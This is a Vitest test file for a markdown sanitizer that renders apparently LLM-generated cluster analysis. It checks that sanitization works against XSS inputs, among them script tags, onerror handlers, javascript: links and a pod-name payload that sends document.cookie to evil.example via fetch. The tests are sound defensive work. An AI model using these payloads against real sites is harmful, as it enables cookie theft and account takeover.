import { describe, expect, test } from "vitest";
import { renderSafeMarkdown } from "../services/MarkdownService";

describe("renderSafeMarkdown", () => {
  test("removes script tags and their content", () => {
    const html = renderSafeMarkdown(
      "Cluster <script>alert('xss')</script> health is fine.",
    );
    expect(html).not.toContain("<script");
    expect(html).not.toContain("alert(");
    expect(html).toContain("Cluster");
    expect(html).toContain("health is fine.");
  });

  test("strips event handlers from raw HTML", () => {
    const html = renderSafeMarkdown('<img src=x onerror="alert(1)">');
    expect(html).not.toContain("onerror");
    expect(html).not.toContain("alert(");
  });

  test("strips javascript: links", () => {
    const html = renderSafeMarkdown("[click me](javascript:alert(1))");
    expect(html).not.toContain("javascript:");
  });

  test("neutralizes a payload embedded in a cluster object name", () => {
    // Mirrors the LLM output path: cluster object names flow into the
    // markdown, so a pod named like this must never execute
    const analysis =
      "Pod <img src=x onerror=fetch('https://evil.example/'+document.cookie)> " +
      "is restarting.";
    const html = renderSafeMarkdown(analysis);
    const container = document.createElement("div");
    container.innerHTML = html;
    expect(container.querySelector("[onerror]")).toBeNull();
    expect(container.querySelector("[href^='javascript:']")).toBeNull();
    expect(container.querySelector("script")).toBeNull();
    expect(container.textContent).toContain("is restarting.");
  });

  test("renders normal markdown unchanged", () => {
    const html = renderSafeMarkdown(
      "# Analysis\n\n**bold** and `code`\n\n- first\n- second",
    );
    expect(html).toContain("<h1");
    expect(html).toContain("<strong>bold</strong>");
    expect(html).toContain("<code>code</code>");
    expect(html).toContain("<li>first</li>");
  });

  test("renders line breaks (breaks: true) as in the stats page", () => {
    const html = renderSafeMarkdown("First line\nSecond line");
    expect(html).toContain("First line<br>Second line");
  });

  test("returns an empty string for empty input", () => {
    expect(renderSafeMarkdown("")).toBe("");
  });
});
